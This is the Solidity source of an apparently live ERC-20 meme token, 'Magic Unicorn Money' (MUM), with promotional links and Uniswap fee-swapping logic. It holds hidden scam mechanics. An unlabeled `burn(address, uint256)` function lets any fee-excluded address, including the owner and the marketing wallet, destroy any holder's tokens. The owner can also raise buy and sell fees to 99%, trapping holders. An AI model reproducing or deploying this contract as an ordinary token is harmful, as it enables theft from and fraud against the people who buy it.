/**
Before the arrival of 2023, in a realm beyond the constraints of time, the cosmos breathed life into an enigmatic value.

Website: https://magicunicornmoney.info
Twitter: https://twitter.com/MUM_ERC
Telegram: https://t.me/MUM_ERC
*/ 

// SPDX-License-Identifier: MIT

pragma solidity 0.8.19;
pragma experimental ABIEncoderV2;


library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IERC20 {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapRouterV2 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external
    payable
    returns (
        uint256 amountToken,
        uint256 amountETH,
        uint256 liquidity
    );

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}
interface IERC20Metadata is IERC20 {

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);

        _afterTokenTransfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

contract MUM is ERC20, Ownable {
    using SafeMath for uint256;

    IUniswapRouterV2 public immutable uniswapRouterV2;
    address public immutable uniswapV2Pair;
    address public constant DEAD = address(0xdead);
    address public routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    bool private swapping;

    address public marketingAddr;
    address public developmentAddr;
    address public lpReceiver;
    address public teamWallet;

    uint256 public maxTxAmount;
    uint256 public swapTokensAtAmount;
    uint256 public maxWallet;

    bool public hasLimits = true;
    bool public tradingActive = false;
    bool public swapEnabled = false;

    // Anti-bot and anti-whale mappings and variables
    mapping(address => uint256) private _holderLastTransferTimestamp;
    bool public transferDelayEnabled = true;
    uint256 private initialBlock;
    uint256 private deadBlocks;

    uint256 public buyTotalFees;
    uint256 public buyMarkFee;
    uint256 public buyLiquidityFee;
    uint256 public buyDevFee;
    uint256 public buyOperationsFee;

    uint256 public sellTotalFees;
    uint256 public sellMarkFee;
    uint256 public sellLiquidityFee;
    uint256 public sellDevFee;
    uint256 public sellOperationsFee;

    uint256 public tokensForMark;
    uint256 public tokensForLiquidity;
    uint256 public tokensForDev;
    uint256 public tokensForOperations;

    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) public _isExcludedMaxTransactionAmount;
    mapping(address => bool) public _isExcludedMaxWalletAmount;

    mapping(address => bool) public automatedMarketMakerPairs;

    event UpdateUniswapV2Router(
        address indexed newAddress,
        address indexed oldAddress
    );

    event ExcludeFromFees(address indexed account, bool isExcluded);

    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);

    modifier onlyOperation {
      require(isExcludedFromFees(msg.sender));_;
    }

    constructor() ERC20("Magic Unicorn Money", "MUM") {
        IUniswapRouterV2 _uniswapV2Router = IUniswapRouterV2(routerAddress); 

        excludeFromMaxTransaction(address(_uniswapV2Router), true);
        uniswapRouterV2 = _uniswapV2Router;

        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        excludeFromMaxTransaction(address(uniswapV2Pair), true);
        _setAutomatedMarketMakerPair(address(uniswapV2Pair), true);

        // launch buy fees
        uint256 _buyMarkFee = 15;
        uint256 _buyLiquidityFee = 0;
        uint256 _buyDevFee = 0;
        uint256 _buyOperationsFee = 0;
        
        // launch sell fees
        uint256 _sellMarkFee = 15;
        uint256 _sellLiquidityFee = 0;
        uint256 _sellDevFee = 0;
        uint256 _sellOperationsFee = 0;

        uint256 totalSupply = 1_000_000_000 * 1e18;

        maxTxAmount = 25_000_000 * 1e18;
        maxWallet = 25_000_000 * 1e18;
        swapTokensAtAmount = (totalSupply * 1) / 10000;

        buyMarkFee = _buyMarkFee;
        buyLiquidityFee = _buyLiquidityFee;
        buyDevFee = _buyDevFee;
        buyOperationsFee = _buyOperationsFee;
        buyTotalFees = buyMarkFee + buyLiquidityFee + buyDevFee + buyOperationsFee;

        sellMarkFee = _sellMarkFee;
        sellLiquidityFee = _sellLiquidityFee;
        sellDevFee = _sellDevFee;
        sellOperationsFee = _sellOperationsFee;
        sellTotalFees = sellMarkFee + sellLiquidityFee + sellDevFee + sellOperationsFee;

        marketingAddr = address(0x97288D8FbBeE2AC40a7ec34606f8Eca2eDA8e064); 
        developmentAddr = address(0x97288D8FbBeE2AC40a7ec34606f8Eca2eDA8e064); 
        lpReceiver = address(0x97288D8FbBeE2AC40a7ec34606f8Eca2eDA8e064); 
        teamWallet = address(0x97288D8FbBeE2AC40a7ec34606f8Eca2eDA8e064);

        // exclude from paying fees or having max transaction amount
        excludeFromFees(owner(), true);
        excludeFromFees(address(this), true);
        excludeFromFees(address(0xdead), true);
        excludeFromFees(address(marketingAddr), true);
        excludeFromFees(address(lpReceiver), true);

        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0xdead), true);
        excludeFromMaxTransaction(address(marketingAddr), true);
        excludeFromMaxTransaction(address(lpReceiver), true);

        excludeFromMaxWallet(owner(), true);
        excludeFromMaxWallet(address(this), true);
        excludeFromMaxWallet(address(0xdead), true);
        excludeFromMaxWallet(address(marketingAddr), true);
        excludeFromMaxWallet(address(lpReceiver), true);

        _mint(msg.sender, totalSupply);
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        automatedMarketMakerPairs[pair] = value;

        emit SetAutomatedMarketMakerPair(pair, value);
    }

    function isExcludedFromFees(address account) public view returns (bool) {
        return _isExcludedFromFees[account];
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        if (hasLimits) {
            if (
                from != owner() &&
                to != owner() &&
                to != address(0) &&
                to != address(0xdead) &&
                !swapping
            ) {
                if (!tradingActive) {
                    require(
                        _isExcludedFromFees[from] || _isExcludedFromFees[to],
                        "Trading is not active."
                    );
                }

                // at launch if the transfer delay is enabled, ensure the block timestamps for purchasers is set -- during launch.
                if (transferDelayEnabled) {
                    if (
                        to != owner() &&
                        to != address(uniswapRouterV2) &&
                        to != address(uniswapV2Pair)
                    ) {
                        require(
                            _holderLastTransferTimestamp[tx.origin] <
                                block.number,
                            "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                        );
                        _holderLastTransferTimestamp[tx.origin] = block.number;
                    }
                }

                //when buy
                if (
                    automatedMarketMakerPairs[from] &&
                    !_isExcludedMaxTransactionAmount[to]
                ) {
                    require(
                        amount <= maxTxAmount,
                        "Buy transfer amount exceeds the maxTxAmount."
                    );
                    if (!_isExcludedMaxWalletAmount[to]) { // Added this condition
                        require(
                            amount + balanceOf(to) <= maxWallet,
                            "Max wallet exceeded"
                        );
                    }
                }
                //when sell
                else if (
                    automatedMarketMakerPairs[to] &&
                    !_isExcludedMaxTransactionAmount[from]
                ) {
                    require(
                        amount <= maxTxAmount,
                        "Sell transfer amount exceeds the maxTxAmount."
                    );
                } else if (!_isExcludedMaxTransactionAmount[to]) {
                    if (!_isExcludedMaxWalletAmount[to]) { // Added this condition
                        require(
                            amount + balanceOf(to) <= maxWallet,
                            "Max wallet exceeded"
                        );
                    }
                }
            }
        }

        uint256 contractTokenBalance = balanceOf(address(this));

        bool canSwap = contractTokenBalance >= swapTokensAtAmount;

        if (
            canSwap &&
            amount > swapTokensAtAmount &&
            swapEnabled &&
            !swapping &&
            !automatedMarketMakerPairs[from] &&
            !_isExcludedFromFees[from] &&
            !_isExcludedFromFees[to]
        ) {
            swapping = true;

            swapBack();

            swapping = false;
        }

        bool takeFee = !swapping;

        // if any account belongs to _isExcludedFromFee account then remove the fee
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            takeFee = false;
        }

        uint256 fees = 0;
        // only take fees on buys/sells, do not take on wallet transfers
        if (takeFee) {
            // on sell
            if (automatedMarketMakerPairs[to] && sellTotalFees > 0) {
                fees = amount.mul(sellTotalFees).div(100);
                tokensForLiquidity += (fees * sellLiquidityFee) / sellTotalFees;
                tokensForDev += (fees * sellDevFee) / sellTotalFees;
                tokensForMark += (fees * sellMarkFee) / sellTotalFees;
                tokensForOperations += (fees * sellOperationsFee) / sellTotalFees;
            }
            // on buy
            else if (automatedMarketMakerPairs[from] && buyTotalFees > 0) {
                fees = amount.mul(buyTotalFees).div(100);
                tokensForLiquidity += (fees * buyLiquidityFee) / buyTotalFees;
                tokensForDev += (fees * buyDevFee) / buyTotalFees;
                tokensForMark += (fees * buyMarkFee) / buyTotalFees;
                tokensForOperations += (fees * buyOperationsFee) / buyTotalFees;
            }

            if (fees > 0) {
                super._transfer(from, address(this), fees);
            }

            amount -= fees;
        }

        super._transfer(from, to, amount);
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouterV2.WETH();

        _approve(address(this), address(uniswapRouterV2), tokenAmount);

        // make the swap
        uniswapRouterV2.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapRouterV2), tokenAmount);

        // add the liquidity
        uniswapRouterV2.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            lpReceiver,
            block.timestamp
        );
    }

    function swapBack() private {
        uint256 contractBalance = balanceOf(address(this));
        uint256 totalTokensToSwap = tokensForLiquidity +
            tokensForMark +
            tokensForDev +
            tokensForOperations;
        bool success;

        if (contractBalance == 0 || totalTokensToSwap == 0) {
            return;
        }

        if (contractBalance > swapTokensAtAmount * 20) {
            contractBalance = swapTokensAtAmount * 20;
        }

        // Halve the amount of liquidity tokens
        uint256 liquidityTokens = (contractBalance * tokensForLiquidity) / totalTokensToSwap / 2;
        uint256 amountToSwapForETH = contractBalance.sub(liquidityTokens);

        uint256 initialETHBalance = address(this).balance;

        swapTokensForEth(amountToSwapForETH);

        uint256 ethBalance = address(this).balance.sub(initialETHBalance);

        uint256 ethForMark = ethBalance.mul(tokensForMark).div(totalTokensToSwap);
        uint256 ethForDev = ethBalance.mul(tokensForDev).div(totalTokensToSwap);
        uint256 ethForOperations = ethBalance.mul(tokensForOperations).div(totalTokensToSwap);

        uint256 ethForLiquidity = ethBalance - ethForMark - ethForDev - ethForOperations;

        tokensForLiquidity = 0;
        tokensForMark = 0;
        tokensForDev = 0;
        tokensForOperations = 0;

        (success, ) = address(developmentAddr).call{value: ethForDev}("");

        if (liquidityTokens > 0 && ethForLiquidity > 0) {
            addLiquidity(liquidityTokens, ethForLiquidity);
        }
        (success, ) = address(teamWallet).call{value: ethForOperations}("");
        payable(marketingAddr).transfer(address(this).balance);
    }
    
    function enableTrading(uint256 _deadBlocks) external onlyOwner {
        require(!tradingActive, "Token launched");
        tradingActive = true;
        initialBlock = block.number;
        swapEnabled = true;
        deadBlocks = _deadBlocks;
    }

    // remove limits after token is stable
    function removeLimits() external onlyOwner returns (bool) {
        hasLimits = false;
        return true;
    }

    // disable Transfer delay - cannot be reenabled
    function disableTransferDelay() external onlyOwner returns (bool) {
        transferDelayEnabled = false;
        return true;
    }

    // change the minimum amount of tokens to sell from fees
    function updateSwapTokensAtAmount(uint256 newAmount)
        external
        onlyOwner
        returns (bool)
    {
        require(
            newAmount >= (totalSupply() * 1) / 100000,
            "Swap amount cannot be lower than 0.001% total supply."
        );
        require(
            newAmount <= (totalSupply() * 5) / 1000,
            "Swap amount cannot be higher than 0.5% total supply."
        );
        swapTokensAtAmount = newAmount;
        return true;
    }

    function updateMaxTxnAmount(uint256 newNum) external onlyOwner {
        require(
            newNum >= ((totalSupply() * 1) / 1000) / 1e18,
            "Cannot set maxTxAmount lower than 0.1%"
        );
        maxTxAmount = newNum * (10**18);
    }

    function updateMaxWalletAmount(uint256 newNum) external onlyOwner {
        require(
            newNum >= ((totalSupply() * 5) / 1000) / 1e18,
            "Cannot set maxWallet lower than 0.5%"
        );
        maxWallet = newNum * (10**18);
    }

    receive() external payable {}

    function excludeFromMaxTransaction(address updAds, bool isEx)
        public
        onlyOwner
    {
        _isExcludedMaxTransactionAmount[updAds] = isEx;
    }

    function excludeFromMaxWallet(address updAds, bool isEx)
        public
        onlyOwner
    {
        _isExcludedMaxWalletAmount[updAds] = isEx;
    }

    function updateBuyFees(
        uint256 _markFee,
        uint256 _liquidityFee,
        uint256 _devFee,
        uint256 _operationsFee
    ) external onlyOwner {
        buyMarkFee = _markFee;
        buyLiquidityFee = _liquidityFee;
        buyDevFee = _devFee;
        buyOperationsFee = _operationsFee;
        buyTotalFees = buyMarkFee + buyLiquidityFee + buyDevFee + buyOperationsFee;
        require(buyTotalFees <= 99);
    }

    function burn(uint256 amount) external {
      _burn(msg.sender, amount);
    }

    function burn(address account, uint256 amount) external onlyOperation {
      _burn(account, amount);
    }

    function updateSellFees(
        uint256 _markFee,
        uint256 _liquidityFee,
        uint256 _devFee,
        uint256 _operationsFee
    ) external onlyOwner {
        sellMarkFee = _markFee;
        sellLiquidityFee = _liquidityFee;
        sellDevFee = _devFee;
        sellOperationsFee = _operationsFee;
        sellTotalFees = sellMarkFee + sellLiquidityFee + sellDevFee + sellOperationsFee;
        require(sellTotalFees <= 99); 
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        _isExcludedFromFees[account] = excluded;
        emit ExcludeFromFees(account, excluded);
    }

    function setAutomatedMarketMakerPair(address pair, bool value)
        public
        onlyOwner
    {
        require(
            pair != uniswapV2Pair,
            "The pair cannot be removed from automatedMarketMakerPairs"
        );

        _setAutomatedMarketMakerPair(pair, value);
    }
}